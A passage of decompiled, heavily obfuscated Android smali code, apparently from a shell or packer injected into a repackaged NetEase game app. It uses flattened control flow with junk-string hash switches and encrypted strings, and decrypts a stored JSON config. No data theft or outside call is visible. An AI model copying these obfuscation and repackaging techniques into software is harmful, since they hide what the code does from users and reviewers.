    const-string v0, "\u06d8\u06e4\u06e0\u06e7\u06dc\u06d8\u06d8\u06da\u06db\u06e0\u06e1\u06e8\u06d7\u06e0\u06e8\u06d6\u06e8\u06dc\u06d8\u06e1\u06d7\u06d9\u06e4\u06d6\u06e8\u06da\u06d9\u06d6\u06d8\u06d7\u06d8\u06ec\u06df\u06e1\u06e1\u06d8\u06d9\u06df\u06e1"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_2
    const-string v0, "\u06d9\u06ec\u06e1\u06d8\u06d7\u06db\u06e6\u06e6\u06e2\u06e2\u06df\u06e8\u06e2\u06e5\u06dc\u06e6\u06e5\u06eb\u06da\u06e2\u06e7\u06e0\u06e5\u06e7\u06e5\u06d8\u06eb\u06dc\u06e6\u06d7\u06d7\u06da\u06da\u06d8\u06d9\u06da\u06dc\u06d8\u06da\u06e4\u06df\u06e4\u06eb\u06e5\u06d8\u06d7\u06e8\u06e4\u06e6\u06e5\u06e0\u06e7\u06df\u06ec\u06e1\u06e0\u06d7"

    goto :goto_2

    :sswitch_3
    const-string v0, "\u06d7\u06e4\u06d7\u06df\u06e5\u06e6\u06df\u06db\u06d8\u06d8\u06e4\u06e1\u06d6\u06e6\u06d9\u06e0\u06e4\u06df\u06eb\u06ec\u06da\u06eb\u06e1\u06e6\u06e5\u06d8\u06e1\u06e2\u06e1\u06d8\u06da\u06d6\u06dc"

    goto :goto_1

    :cond_0
    const-string v0, "\u06db\u06e1\u06e5\u06d8\u06d9\u06e8\u06d7\u06ec\u06db\u06dc\u06e8\u06e1\u06d8\u06e4\u06e1\u06d8\u06e8\u06db\u06eb\u06da\u06e4\u06d7\u06e1\u06d7\u06e6\u06db\u06e1\u06e1\u06df\u06e5\u06df\u06e5\u06e8\u06e1\u06e5\u06d8\u06e2\u06e7\u06e1\u06e8\u06d9\u06e6\u06eb\u06d8\u06df\u06eb\u06e4\u06e6\u06d8\u06e0\u06d8\u06e5\u06d8\u06e7\u06e7\u06e6\u06d8"

    goto :goto_2

    :sswitch_4
    invoke-static {}, Lcom/netease/mc/m439a/kgKPsAcxcvLVr;->getShellContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, LKvrUY/RiiGL/Utils;->isRequest(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u06da\u06d8\u06da\u06d7\u06d9\u06d7\u06eb\u06ec\u06d6\u06d8\u06e1\u06df\u06db\u06d7\u06ec\u06e1\u06e0\u06e8\u06e8\u06eb\u06e1\u06d6\u06e5\u06e8\u06db\u06e5\u06e1\u06e5\u06ec\u06e6\u06d8\u06da\u06dc\u06e7\u06eb\u06e2\u06e8\u06d8\u06e0\u06e1\u06e2\u06e8\u06ec\u06e6\u06eb\u06e6\u06d6\u06d8\u06e0\u06dc\u06df"

    goto :goto_2

    :sswitch_5
    const-string v0, "\u06d9\u06d6\u06da\u06ec\u06e4\u06e7\u06e8\u06da\u06e2\u06e8\u06e6\u06d8\u06e6\u06eb\u06e6\u06d8\u06e0\u06e4\u06e8\u06ec\u06da\u06df\u06e2\u06e0\u06d9\u06eb\u06da\u06e1\u06da\u06da\u06e8\u06e0\u06e6\u06da\u06e7\u06df\u06eb\u06e4\u06eb\u06d9\u06e1\u06e8\u06da\u06e4\u06e2\u06da\u06e0\u06d8\u06e6\u06e1\u06e5\u06e4\u06ec\u06db\u06da"

    goto :goto_1

    :sswitch_6
    const-string v0, "\u06e2\u06da\u06dc\u06e2\u06eb\u06d8\u06d8\u06ec\u06e6\u06e1\u06d8\u06d6\u06d6\u06e7\u06eb\u06e5\u06d8\u06d8\u06eb\u06d7\u06dc\u06ec\u06e5\u06e7\u06d8\u06df\u06e1\u06d6\u06db\u06e7\u06e4\u06da\u06eb\u06d6\u06e6\u06e6\u06d8\u06e8\u06e7\u06df\u06ec\u06e5\u06eb\u06e4\u06e5\u06e4\u06db\u06dc\u06d8\u06d8\u06df\u06d6\u06d8\u06d8\u06dc\u06d6\u06e5\u06e7\u06eb\u06e7"

    goto :goto_1

    :sswitch_7
    const-string v0, "\u06e1\u06e5\u06df\u06db\u06e4\u06e6\u06d8\u06e0\u06eb\u06db\u06e5\u06df\u06dc\u06e5\u06e0\u06e8\u06d8\u06d7\u06dc\u06d9\u06e4\u06e4\u06e8\u06d8\u06d6\u06eb\u06d6\u06e6\u06e0\u06d6\u06d8\u06e4\u06dc\u06e7\u06d8\u06dc\u06d9\u06ec\u06e7\u06dc\u06dc"

    goto :goto_0

    :sswitch_8
    invoke-static {}, Landroidx/base/복원;->isDebug()Z

    move-result v0

    :goto_3
    return v0

    :sswitch_9
    sget-boolean v0, Landroidx/base/저장;->c:Z

    goto :goto_3

    :sswitch_a
    const-string v0, "\u06e8\u06e1\u06db\u06da\u06d7\u06e1\u06d8\u06e7\u06e0\u06e0\u06eb\u06dc\u06e6\u06e8\u06e8\u06e6\u06e1\u06e8\u06e7\u06d6\u06eb\u06db\u06e1\u06dc\u06e6\u06d8\u06d9\u06e7\u06ec\u06e7\u06d6\u06d8\u06d8\u06eb\u06d8\u06dc\u06d8\u06df\u06e5\u06db\u06eb\u06d9\u06e2\u06e1\u06d9"

    goto :goto_0

    :sswitch_data_0
    .sparse-switch
        0x30cefbe8 -> :sswitch_0
        0x3787349f -> :sswitch_8
        0x583bccca -> :sswitch_9
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x7dd5a3a9 -> :sswitch_1
        -0x4a953b9a -> :sswitch_7
        -0x4f1c158 -> :sswitch_a
        0x39f0599b -> :sswitch_6
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x2f6ada9e -> :sswitch_4
        -0x2d5ebdbe -> :sswitch_2
        0x9ba8776 -> :sswitch_3
        0x564d6d58 -> :sswitch_5
    .end sparse-switch
.end method

.method public static offline(Landroid/content/Context;)V
    .locals 14

    :try_start_0
    const-string v0, "At0Lybkn\n"

    const-string v1, "YbJlr9BAFs8=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, LKvrUY/RiiGL/Utils;->shellSP_read(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const v2, 0x4854c51a

    const-string v0, "\u06db\u06e8\u06e8\u06d6\u06e7\u06dc\u06d8\u06d7\u06d9\u06df\u06e8\u06ec\u06da\u06e0\u06d8\u06e8\u06d8\u06e5\u06ec\u06d9\u06eb\u06d7\u06d6\u06d8\u06e4\u06e1\u06db\u06e8\u06da\u06e8\u06db\u06d8\u06d6"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06ec\u06e5\u06d8\u06d8\u06e2\u06d9\u06e8\u06d9\u06d8\u06d6\u06d8\u06e2\u06d9\u06e4\u06da\u06da\u06dc\u06d8\u06e1\u06e4\u06e5\u06d8\u06d6\u06d7\u06e8\u06db\u06e6\u06e8\u06d8\u06d8\u06eb\u06e6\u06d8\u06d9\u06e8\u06dc\u06d8\u06eb\u06e0\u06df\u06e0\u06e4\u06e0\u06e8\u06e7\u06e8\u06d8\u06db\u06e7\u06e6\u06d8\u06e0\u06d9\u06e1\u06d8\u06e1\u06d8\u06e7\u06d8\u06e6\u06d6\u06eb\u06db\u06ec"

    goto :goto_0

    :sswitch_1
    :try_start_1
    const-string v0, "\u06da\u06e1\u06e0\u06dc\u06e8\u06e4\u06e8\u06df\u06e5\u06d8\u06e8\u06d6\u06db\u06eb\u06d8\u06dc\u06d8\u06e8\u06e7\u06e1\u06e1\u06d6\u06db\u06ec\u06d7\u06da\u06e6\u06dc\u06da\u06e2\u06e5\u06dc\u06d7\u06e1\u06e4\u06da\u06d7\u06e8"

    goto :goto_0

    :sswitch_2
    const v3, 0x5a383904

    const-string v0, "\u06dc\u06ec\u06df\u06d8\u06d8\u06d8\u06d9\u06e7\u06eb\u06ec\u06e8\u06e7\u06e2\u06d9\u06d6\u06eb\u06db\u06d7\u06d7\u06e0\u06dc\u06da\u06e1\u06e5\u06df\u06df\u06dc\u06db\u06e5\u06e7\u06d8\u06e0\u06e8\u06e0\u06d7\u06eb"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_1

    goto :goto_1

    :sswitch_3
    if-eqz v1, :cond_0

    const-string v0, "\u06e4\u06dc\u06e4\u06e4\u06df\u06d8\u06d6\u06e8\u06d9\u06e4\u06e8\u06e5\u06dc\u06e1\u06e7\u06d8\u06e4\u06d9\u06e1\u06d8\u06e6\u06e4\u06d7\u06e0\u06df\u06d6\u06db\u06eb\u06e1\u06d6\u06e8\u06e5"

    goto :goto_1

    :cond_0
    const-string v0, "\u06da\u06df\u06e1\u06e4\u06eb\u06d6\u06d9\u06d8\u06d7\u06e0\u06e4\u06db\u06e5\u06d8\u06e1\u06dc\u06e5\u06d6\u06da\u06d8\u06e4\u06db\u06e7\u06e2\u06d6\u06d8\u06e4\u06ec\u06e1\u06e0\u06d7\u06d6\u06d8\u06e5\u06e1\u06dc\u06ec\u06e2\u06d8\u06e5\u06d9\u06df\u06da\u06d9\u06ec\u06dc\u06e7\u06e2"

    goto :goto_1

    :sswitch_4
    const-string v0, "\u06d7\u06dc\u06e5\u06d8\u06e4\u06eb\u06e5\u06d8\u06e6\u06e1\u06e7\u06d6\u06e1\u06e1\u06e1\u06dc\u06e4\u06d8\u06da\u06e5\u06eb\u06d8\u06d9\u06df\u06e8\u06d6\u06d8\u06ec\u06d8\u06e7\u06d8\u06e4\u06eb\u06e6\u06d8\u06e5\u06d9\u06dc\u06d8\u06da\u06e0\u06d8"

    goto :goto_1

    :sswitch_5
    const-string v0, "\u06e0\u06eb\u06e7\u06dc\u06e2\u06db\u06e1\u06e5\u06dc\u06da\u06e8\u06e7\u06e4\u06d9\u06d7\u06e0\u06e4\u06e1\u06da\u06e7\u06e4\u06ec\u06d7\u06ec\u06df\u06d7\u06dc\u06ec\u06d9\u06e4"

    goto :goto_0

    :sswitch_6
    const v2, -0x2a96c41f

    const-string v0, "\u06ec\u06df\u06da\u06e1\u06e0\u06e1\u06d8\u06e8\u06da\u06df\u06ec\u06dc\u06d6\u06d8\u06d7\u06d9\u06db\u06e1\u06eb\u06d6\u06d8\u06df\u06dc\u06d6\u06d6\u06df\u06e8\u06d8\u06d9\u06d6\u06e6\u06da\u06d8\u06e8\u06e7\u06d7\u06e4\u06da\u06d8\u06d8\u06e7\u06da\u06eb\u06e5\u06d6\u06e5\u06e2\u06e1\u06e1\u06df\u06ec\u06e1\u06d8\u06e4\u06e0\u06df\u06e4"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_7
    const v3, 0x6e61d4b4

    const-string v0, "\u06e1\u06d7\u06e1\u06e8\u06dc\u06db\u06e8\u06da\u06e6\u06d8\u06e7\u06d7\u06dc\u06d8\u06e5\u06da\u06e6\u06d8\u06d9\u06da\u06e1\u06d7\u06e8\u06dc\u06d8\u06d6\u06e1\u06e1\u06d8\u06df\u06d8\u06dc\u06d6\u06e6\u06df\u06e0\u06d6\u06df\u06d8\u06e7\u06d8\u06dc\u06e5\u06e8\u06e7\u06d7\u06d7"

    :goto_3
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_3

    goto :goto_3

    :sswitch_8
    const-string v0, "\u06e6\u06eb\u06d7\u06dc\u06e7\u06dc\u06d9\u06df\u06db\u06df\u06ec\u06dc\u06d8\u06e8\u06e8\u06e6\u06da\u06da\u06da\u06eb\u06e6\u06dc\u06d8\u06e1\u06df\u06d6\u06e6\u06e0\u06e2\u06db\u06e8\u06e1"

    goto :goto_3

    :sswitch_9
    const-string v0, "\u06eb\u06ec\u06e6\u06d8\u06d9\u06d6\u06d9\u06d6\u06e4\u06dc\u06d8\u06e0\u06dc\u06eb\u06d8\u06db\u06d8\u06e2\u06eb\u06e5\u06dc\u06da\u06d7\u06e2\u06d6\u06d8\u06e7\u06ec\u06e5\u06d8\u06d7\u06e4\u06d9\u06d8\u06da\u06d6\u06da\u06da\u06eb\u06e6\u06df\u06e8\u06e5\u06df\u06db\u06e8\u06eb\u06db\u06e7\u06d6\u06db\u06e0\u06e2\u06df\u06d8\u06d7"

    goto :goto_2

    :cond_1
    const-string v0, "\u06df\u06da\u06e6\u06d8\u06ec\u06d8\u06e7\u06d8\u06e8\u06e1\u06d8\u06e6\u06d6\u06e1\u06d8\u06e7\u06ec\u06ec\u06da\u06e2\u06e4\u06e7\u06d9\u06d8\u06d8\u06dc\u06e8\u06d8\u06e8\u06ec\u06d8\u06d8\u06dc\u06d6\u06e5\u06e1\u06e1\u06e5\u06e2\u06e7\u06df"

    goto :goto_3

    :sswitch_a
    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "\u06eb\u06db\u06e5\u06db\u06eb\u06df\u06ec\u06e7\u06e5\u06d8\u06eb\u06d7\u06db\u06e2\u06eb\u06df\u06ec\u06d7\u06d8\u06d8\u06e4\u06e6\u06e4\u06d6\u06d6\u06d8\u06e1\u06e7\u06ec\u06eb\u06ec\u06e6\u06d8\u06e0\u06ec\u06e1\u06d8\u06ec\u06db\u06d6\u06d6\u06e6\u06e7\u06e1\u06d8\u06da\u06e1\u06d9\u06d7\u06e8\u06da\u06e5"

    goto :goto_3

    :sswitch_b
    const-string v0, "\u06e1\u06e8\u06e8\u06d8\u06e5\u06d7\u06dc\u06d8\u06ec\u06e5\u06e7\u06d7\u06ec\u06d8\u06d8\u06e7\u06db\u06e8\u06d6\u06e5\u06dc\u06d8\u06e5\u06d6\u06df\u06e4\u06e7\u06db\u06e5\u06e6\u06d7\u06da\u06e7\u06eb\u06d6\u06eb\u06da\u06e6\u06e5"

    goto :goto_2

    :sswitch_c
    const-string v0, "\u06e7\u06d6\u06e2\u06dc\u06e6\u06db\u06d6\u06d7\u06e7\u06e7\u06e0\u06e7\u06d6\u06e1\u06eb\u06da\u06df\u06d6\u06d8\u06ec\u06d7\u06e1\u06d8\u06d6\u06d9\u06e6\u06db\u06db\u06e1\u06d8\u06d6\u06ec\u06d6\u06e4\u06e7\u06e1\u06e7\u06e7\u06e5\u06e2\u06e1\u06d6\u06d8\u06e1\u06d7\u06e2"

    goto :goto_2

    :sswitch_d
    const v2, -0x5358e104

    const-string v0, "\u06da\u06d9\u06e4\u06e8\u06db\u06e8\u06d8\u06e4\u06d6\u06e8\u06d8\u06dc\u06d9\u06e5\u06d8\u06e5\u06ec\u06da\u06e5\u06e4\u06e1\u06db\u06df\u06e5\u06d8\u06ec\u06e8\u06d8\u06e1\u06df\u06ec\u06d8\u06df\u06e7\u06d7\u06da\u06dc\u06da\u06db\u06e8\u06e7\u06e5\u06d8\u06e4\u06e7\u06ec"

    :goto_4
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_4

    goto :goto_4

    :sswitch_e
    const-string v0, "HqMbRICYHZ+j2C4w2aZgb91oQ2ra0hFqovg0MsitbEfIoxp5gL8lKvj5Qmvc0i9V\n"

    const-string v1, "RUSn12U1hcI=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "xJc=\n"

    const-string v2, "q/wzoqiY/2c=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    const-string v0, "qqWp3hZ0\n"

    const-string v1, "ycrHuH8T33c=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, LKvrUY/RiiGL/Utils;->shellSP_read(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "z4zcLH8PM/Zw1t9YDgpMFweOzSdzJyZMKcWFNTpKFhY=\n"

    const-string v2, "lGtgv5qiq6s=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "NtM=\n"

    const-string v3, "WbiiSXWEGaI=\n"

    invoke-static {v2, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "0eWmowjH9CXZ5/T1XpWmew==\n"

    const-string v2, "4NeVlz3xwx0=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/저장;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "y4Lxy3IthWPKhfHPfA==\n"

    const-string v1, "qe6QqBly9QI=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v1, 0x0

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v1

    const-string v0, "TkvZXjnCp2dLcd5gOMWnY0Vxwmgo2g==\n"

    const-string v3, "IC6uAVuuxgQ=\n"

    invoke-static {v0, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v6

    const v3, -0x6d58544a

    const-string v0, "\u06e2\u06e6\u06e7\u06d8\u06ec\u06eb\u06d8\u06e0\u06da\u06d6\u06d8\u06df\u06da\u06d8\u06ec\u06e1\u06e6\u06d8\u06e4\u06e0\u06d8\u06e4\u06d7\u06ec\u06e5\u06d9\u06d9\u06d8\u06e5\u06e5\u06e7\u06eb\u06d8\u06d8\u06db\u06e5\u06e0\u06e5\u06d6\u06d8\u06d8\u06d9\u06d9\u06e5\u06e0\u06df\u06d9"

    :goto_5
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_5

    goto :goto_5

    :sswitch_f
    const-string v0, "\u06e2\u06ec\u06e6\u06d8\u06ec\u06e1\u06d9\u06d8\u06e1\u06d8\u06db\u06e5\u06dc\u06d6\u06d6\u06d8\u06d8\u06e6\u06dc\u06d8\u06da\u06e8\u06db\u06e5\u06e1\u06e1\u06e4\u06da\u06e6\u06e1\u06e5\u06e4\u06db\u06e2\u06ec\u06d9\u06d7"

    goto :goto_5

    :sswitch_10
    :try_start_2
    const-string v0, "\u06e0\u06ec\u06e6\u06e6\u06ec\u06e1\u06e0\u06dc\u06dc\u06d8\u06d7\u06e8\u06ec\u06db\u06e7\u06e8\u06e2\u06db\u06d7\u06d6\u06ec\u06e8\u06d9\u06e2\u06da\u06e5\u06e7\u06eb\u06e5\u06d9\u06e1\u06e7\u06d6\u06e7\u06dc\u06e7\u06d6\u06d7\u06d7\u06eb\u06d8\u06dc\u06d7\u06e8\u06e5\u06d8\u06e1\u06e8\u06e7\u06d8\u06db\u06d8\u06e2\u06eb\u06d9\u06d6\u06d8"

    goto :goto_4

    :sswitch_11
    const v3, 0x46ffc574

    const-string v0, "\u06df\u06e7\u06da\u06d7\u06ec\u06e8\u06dc\u06d8\u06ec\u06d9\u06db\u06e1\u06d8\u06d6\u06d6\u06e4\u06e8\u06d8\u06e1\u06d6\u06e2\u06e7\u06e2\u06e6\u06e2\u06d9\u06e7\u06ec\u06e6\u06dc\u06dc\u06d7\u06ec\u06e6\u06e2\u06e0\u06ec\u06e7\u06d8\u06d6\u06d8\u06d7\u06e5\u06e7\u06d6\u06db\u06d8\u06d8\u06d9\u06e6\u06e6\u06d8\u06e2\u06d6\u06e7\u06db\u06da\u06dc"

    :goto_6
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_6

    goto :goto_6

    :sswitch_12
    const-string v0, "\u06dc\u06d6\u06eb\u06d8\u06da\u06e5\u06d8\u06e6\u06d9\u06d8\u06d8\u06e0\u06ec\u06dc\u06d8\u06d7\u06e0\u06d8\u06d8\u06dc\u06e1\u06d8\u06e7\u06ec\u06d6\u06d8\u06e7\u06e7\u06e5\u06df\u06e0\u06e5\u06d8\u06df\u06e1\u06e8"

    goto :goto_6

    :cond_2
    const-string v0, "\u06e8\u06e2\u06d7\u06ec\u06e7\u06d9\u06e7\u06e7\u06eb\u06e7\u06e7\u06e5\u06da\u06ec\u06d9\u06e0\u06e6\u06db\u06dc\u06e1\u06d8\u06d9\u06d7\u06e7\u06ec\u06e6\u06d8\u06d8\u06dc\u06e1\u06dc\u06d8\u06e4\u06e1\u06e0\u06df\u06eb\u06d8\u06d8\u06ec\u06d8\u06e1\u06e7\u06e1\u06e6\u06e1\u06e2\u06e0\u06e8\u06e1\u06e8\u06d8\u06d8\u06db\u06da\u06e1\u06df\u06e7"

    goto :goto_6

    :sswitch_13
    const-string v0, "dpfINQ==\n"

    const-string v4, "GOKkWQYboEA=\n"

    invoke-static {v0, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "\u06e2\u06eb\u06e8\u06db\u06da\u06e1\u06d8\u06dc\u06dc\u06e0\u06d7\u06e1\u06e7\u06d8\u06da\u06e0\u06df\u06e2\u06da\u06eb\u06dc\u06da\u06d6\u06d7\u06e6\u06e5\u06d8\u06e0\u06e5\u06e6\u06e8\u06ec\u06e1"

    goto :goto_6

    :sswitch_14
    const-string v0, "\u06e0\u06da\u06e1\u06d9\u06e0\u06df\u06eb\u06eb\u06d9\u06e0\u06eb\u06e1\u06d8\u06e1\u06e0\u06da\u06d7\u06e2\u06d9\u06db\u06e4\u06df\u06d6\u06e8\u06d8\u06e1\u06d7\u06d6\u06d8\u06d8\u06d8\u06e6\u06d8"

    goto/16 :goto_4

    :sswitch_15
    const-string v0, "\u06dc\u06df\u06e5\u06e2\u06eb\u06d8\u06d7\u06d6\u06d7\u06d7\u06ec\u06e1\u06e4\u06da\u06d8\u06d8\u06d7\u06e5\u06da\u06ec\u06e2\u06d6\u06e8\u06df\u06da\u06d7\u06e5\u06d9\u06e6\u06ec\u06eb\u06e6\u06d9\u06da\u06da\u06ec\u06d7\u06e6\u06d7\u06d9\u06eb\u06df\u06dc\u06d8\u06e0\u06db\u06e6\u06e1\u06e4"

    goto/16 :goto_4

    :sswitch_16
    const-string v0, "\u06dc\u06e1\u06e8\u06d9\u06dc\u06e5\u06d8\u06d7\u06e8\u06e6\u06db\u06eb\u06e8\u06e6\u06e5\u06d8\u06dc\u06eb\u06eb\u06e0\u06e6\u06d6\u06e1\u06da\u06e6\u06d8\u06eb\u06e5\u06e1\u06d8\u06e4\u06eb\u06e5\u06d8\u06d7\u06e2\u06d6\u06e5\u06dc\u06da\u06e4\u06d6\u06e6\u06dc\u06e0\u06eb"

    goto :goto_5

    :sswitch_17
    const v7, 0x3050b70a

    const-string v0, "\u06dc\u06d7\u06eb\u06eb\u06da\u06e0\u06e1\u06df\u06e6\u06d8\u06eb\u06d6\u06eb\u06e7\u06e2\u06e8\u06e4\u06d8\u06eb\u06e5\u06dc\u06dc\u06d8\u06d6\u06e5\u06e0\u06e6\u06e4\u06e0\u06e5\u06d9\u06e8\u06d8\u06e5\u06e5\u06d7\u06e1\u06d7\u06eb\u06da\u06e7\u06ec\u06dc\u06e8\u06d6\u06e7\u06e6\u06e2\u06e6\u06ec\u06d7\u06d6\u06e1\u06d7\u06d7\u06e4\u06d6\u06d8"

    :goto_7
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_7

    goto :goto_7

    :sswitch_18
    const-string v0, "\u06e0\u06db\u06d6\u06d8\u06d9\u06d6\u06d8\u06dc\u06db\u06e8\u06d8\u06e0\u06e5\u06e8\u06df\u06d6\u06d8\u06dc\u06e7\u06e0\u06dc\u06e5\u06e7\u06d8\u06e7\u06dc\u06d8\u06d8\u06eb\u06dc\u06d8\u06d8\u06e7\u06d6\u06d8"

    goto :goto_7

    :cond_3
    const-string v0, "\u06db\u06e4\u06e5\u06d8\u06e7\u06e5\u06dc\u06d8\u06da\u06e2\u06e1\u06e6\u06e1\u06e6\u06da\u06da\u06e2\u06dc\u06eb\u06d6\u06d8\u06e0\u06e5\u06e5\u06d8\u06e5\u06e7\u06eb\u06d7\u06e5\u06dc\u06d8\u06d7\u06eb\u06d7\u06d9\u06d6\u06d8\u06d8\u06d6\u06df\u06e1\u06dc\u06e5\u06dc\u06d8\u06df\u06d9\u06e0\u06eb\u06e4\u06e5\u06d8"

    goto :goto_7

    :sswitch_19
    if-eqz v1, :cond_3

    const-string v0, "\u06e0\u06e4\u06d9\u06d8\u06d6\u06e6\u06d7\u06e8\u06db\u06e8\u06e7\u06e8\u06e8\u06e0\u06eb\u06d8\u06e4\u06df\u06d8\u06e2\u06e4\u06da\u06d7\u06e8\u06e6\u06da\u06eb\u06eb\u06d8\u06eb\u06d7\u06ec\u06e1\u06db\u06e7\u06df\u06dc\u06e8\u06d6\u06e1\u06e0"

    goto :goto_7

    :sswitch_1a
    const-string v0, "\u06d6\u06e1\u06d7\u06e7\u06da\u06d8\u06dc\u06e0\u06e5\u06d8\u06db\u06d7\u06ec\u06db\u06db\u06dc\u06d8\u06e8\u06db\u06e1\u06e8\u06dc\u06d8\u06d8\u06d7\u06e8\u06e2\u06da\u06e0\u06e1\u06d8\u06d9\u06e1\u06ec\u06e7\u06dc\u06dc\u06d8\u06d9\u06e8\u06e5"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_5

    :sswitch_1b
    const v1, -0x3787d19a

    const-string v0, "\u06eb\u06d8\u06d8\u06d8\u06e2\u06d9\u06e6\u06d8\u06d8\u06e1\u06e8\u06d8\u06e5\u06e1\u06d9\u06e5\u06e1\u06db\u06d6\u06db\u06e4\u06e0\u06da\u06ec\u06dc\u06da\u06e4\u06d8\u06eb\u06e8\u06e1\u06e5\u06da"

    :goto_8
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v1

    sparse-switch v3, :sswitch_data_8

    goto :goto_8

    :sswitch_1c
    const v1, 0x7876c6ba

    :try_start_3
    const-string v0, "\u06d6\u06db\u06e2\u06e5\u06e7\u06d7\u06e2\u06e7\u06dc\u06d8\u06dc\u06d7\u06e2\u06eb\u06ec\u06e1\u06df\u06da\u06e8\u06eb\u06e7\u06d6\u06d8\u06e4\u06ec\u06d9\u06d7\u06db\u06e6\u06d8\u06da\u06e8\u06e8"

    :goto_9
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v1

    sparse-switch v3, :sswitch_data_9

    goto :goto_9

    :sswitch_1d
    const v3, 0x26555c7b

    const-string v0, "\u06e8\u06df\u06e1\u06e0\u06e7\u06db\u06eb\u06eb\u06dc\u06db\u06df\u06e6\u06e0\u06e4\u06db\u06dc\u06d8\u06da\u06e5\u06dc\u06d8\u06e5\u06d7\u06dc\u06d8\u06d8\u06df\u06e7\u06da\u06d7\u06da\u06e1\u06e5\u06ec\u06e7\u06e0"

    :goto_a
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_a

    goto :goto_a

    :sswitch_1e
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_5

    const-string v0, "\u06e7\u06e2\u06dc\u06e1\u06d9\u06d9\u06da\u06eb\u06d6\u06d8\u06d6\u06df\u06e8\u06e4\u06d9\u06d9\u06e5\u06e6\u06dc\u06d8\u06eb\u06d9\u06da\u06e5\u06e5\u06df\u06df\u06e6\u06e2\u06e8\u06e0\u06e5\u06d8\u06e1\u06eb\u06d7\u06e7\u06d9\u06e2"
